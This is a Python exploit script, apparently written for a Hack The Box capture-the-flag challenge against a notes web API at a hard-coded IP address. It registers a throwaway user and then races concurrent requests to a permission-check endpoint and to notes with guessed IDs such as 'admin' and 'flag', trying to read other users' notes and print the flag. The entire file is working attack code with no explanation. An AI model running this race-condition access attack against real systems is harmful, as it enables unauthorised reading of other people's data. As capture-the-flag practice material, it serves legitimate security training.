#!/usr/bin/env python3
import asyncio
import aiohttp
import time

BASE_URL = "http://83.136.255.203:47148"

async def exploit():
    # Create user
    async with aiohttp.ClientSession() as session:
        email = f"async_{int(time.time()*1000000)}@htb.com"
        async with session.post(f"{BASE_URL}/api/auth/register",
                               json={"email": email, "password": "test"}) as resp:
            data = await resp.json()
            token = data['token']
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # Get my note
        async with session.get(f"{BASE_URL}/api/notes", headers=headers) as resp:
            data = await resp.json()
            my_note = data['notes'][0]['id']
        
        print(f"[*] User: {email}")
        print(f"[*] My note: {my_note}")
        
        # System IDs to try
        targets = ["admin", "root", "system", "secret", "challenge", "htb",
                  "hidden", "flag", "administrator", "d3vnu11", "god-mode",
                  "superadmin-flag", "celestial-scribe-secret"]
        
        for target in targets:
            print(f"\n[*] Target: {target}")
            
            # Try 50 times
            for attempt in range(50):
                # Create two tasks that run truly in parallel
                check_task = session.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", 
                                        headers=headers)
                get_task = session.get(f"{BASE_URL}/api/notes/{target}", 
                                      headers=headers)
                
                # Run both simultaneously
                responses = await asyncio.gather(check_task, get_task, return_exceptions=True)
                
                # Check the GET response
                try:
                    data = await responses[1].json()
                    if data.get('success'):
                        content = data.get('note', {}).get('content', '')
                        print(f"  [+] SUCCESS on attempt {attempt}!")
                        print(f"      Content: {content}")
                        
                        if 'HTB{' in content:
                            print(f"\n  [!!!!!!] FLAG: {content}\n")
                            return content
                        break
                except:
                    pass
                
                # Small delay
                await asyncio.sleep(0.05)
        
        print("\n[*] No flag found")
        return None

# Run
flag = asyncio.run(exploit())
if flag:
    print(f"\n\nFINAL FLAG: {flag}\n")
